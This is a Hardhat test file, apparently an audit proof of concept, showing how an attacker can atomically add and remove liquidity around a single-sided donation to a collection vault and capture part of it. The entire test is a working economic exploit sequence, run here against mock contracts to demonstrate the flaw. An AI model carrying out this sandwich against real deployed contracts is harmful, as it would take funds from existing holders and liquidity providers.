import { expect } from "chai";
import { ethers } from "hardhat";
import { takeSnapshot, type SnapshotRestorer } from "@nomicfoundation/hardhat-network-helpers";

/**
 * AUDIT PoC — just-in-time (JIT) LP capture of single-sided donations.
 *
 * `addLiquidity` / `removeLiquidity` charge NO fee and have NO lock-up, so an
 * atomic add -> (donation lands) -> remove sandwich lets an attacker take a
 * proportional slice of any `paymentReserve` donation (`donateReserves` or
 * `_compoundXToken`'s Stream-A carve-out) that was meant for existing S
 * holders / existing LPs.
 */
describe("AUDIT PoC: JIT LP sandwiches paymentReserve donations", () => {
  let snap: SnapshotRestorer;
  before(async () => { snap = await takeSnapshot(); });
  after(async () => { await snap.restore(); });

  const TIMELOCK = 48 * 3600;

  it("attacker adds+removes liquidity atomically around a donation and walks away with a slice of it", async () => {
    const [deployer, sink, treasury, alice, attacker] = await ethers.getSigners();
    const payment: any = await (await ethers.getContractFactory("MockIndexToken")).deploy("PAY", "PAY");
    const nft: any = await (await ethers.getContractFactory("MockRobinWoodNft")).deploy();
    const factory: any = await (
      await ethers.getContractFactory("CollectionVaultFactory")
    ).deploy(sink.address, await payment.getAddress(), TIMELOCK);

    const vaultAddr = await factory.deployVault.staticCall(await nft.getAddress(), treasury.address, 810);
    await factory.deployVault(await nft.getAddress(), treasury.address, 810);
    const vault: any = await ethers.getContractAt("CollectionVault", vaultAddr);

    for (const who of [alice, attacker, treasury, deployer]) {
      await payment.mint(who.address, ethers.parseEther("100000"));
      await payment.connect(who).approve(vaultAddr, ethers.MaxUint256);
      await vault.connect(who).approve(vaultAddr, ethers.MaxUint256);
    }

    // alice mints 20 S by depositing 20 NFTs
    for (let i = 1; i <= 20; i++) {
      await nft.mint(alice.address, i);
      await nft.connect(alice).approve(vaultAddr, i);
      await vault.connect(alice).deposit(i);
    }
    // attacker mints 10 S
    for (let i = 101; i <= 110; i++) {
      await nft.mint(attacker.address, i);
      await nft.connect(attacker).approve(vaultAddr, i);
      await vault.connect(attacker).deposit(i);
    }

    // Bootstrap: 100 PAY / 10 S
    const seedPayment = ethers.parseEther("100");
    const seedShares = ethers.parseEther("10");
    await vault.connect(treasury).seedLiquidity(seedPayment);
    await vault.connect(alice).transfer(treasury.address, seedShares);
    await vault.connect(treasury).seedShares(seedShares);
    await vault.connect(treasury).openPool();

    const payBefore = await payment.balanceOf(attacker.address);
    const sBefore = await vault.balanceOf(attacker.address);

    // ── the sandwich ────────────────────────────────────────────────────
    // 1. JIT add: 100 PAY (matched 10 S derived by the pool). Now attacker
    //    owns ~50% of all LP claims.
    const [lpOut] = await vault.connect(attacker).addLiquidity.staticCall(seedPayment, 0);
    await vault.connect(attacker).addLiquidity(seedPayment, 0);

    // 2. A 10 PAY donation lands (this is exactly what _compoundXToken /
    //    donateReserves do — instant, unvested, single-sided).
    await vault.connect(deployer).donateReserves(ethers.parseEther("10"));

    // 3. JIT remove, same instant.
    await vault.connect(attacker).removeLiquidity(lpOut, 0, 0);

    const payAfter = await payment.balanceOf(attacker.address);
    const sAfter = await vault.balanceOf(attacker.address);

    const payGain = payAfter - payBefore;
    const sDelta = sAfter - sBefore;

    console.log("attacker PAY gain :", ethers.formatEther(payGain));
    console.log("attacker S delta  :", ethers.formatEther(sDelta));

    // Zero-fee, zero-risk, single-block: attacker nets a slice of the donation.
    expect(payGain > 0n, "attacker should have captured PAY from the donation").to.equal(true);
    // and did not have to give up S to do it
    expect(sDelta >= -1n).to.equal(true);
  });
});
